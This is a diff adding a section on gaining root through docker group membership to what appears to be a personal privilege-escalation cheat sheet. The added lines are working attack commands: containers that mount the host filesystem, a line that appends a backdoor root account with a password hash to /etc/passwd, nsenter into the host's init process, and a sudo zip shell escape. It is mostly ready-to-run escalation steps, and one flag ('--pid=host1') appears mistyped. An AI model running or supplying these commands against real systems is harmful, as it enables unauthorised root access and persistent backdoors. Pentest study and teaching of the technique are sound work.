@@ -1082,6 +1082,29 @@ create a kunal.zip file inside /tmp
 	sudo zip /tmp/kunal.zip /tmp/ -T --unzip-command="sh -c /bin/bash"
 and you are root
 
+
+-----------------------
+Gaining root via docker
+-----------------------
+if user is in docker group
+
+kunal@data:/tmp$ id
+uid=1000(kunal) gid=1000(kunal) groups=1000(kunal),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare),122(docker)
+
+Just run this
+docker run --rm -it --pid=host1 --net=host1 --privileged -v /:/host ubuntu bash
+
+OR
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#docker
+
+docker run -it --rm -v $PWD:/mnt bash
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
+or
+docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+or
+sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+
 -----------------------------
 If systemctl has SUID bit set
 -----------------------------
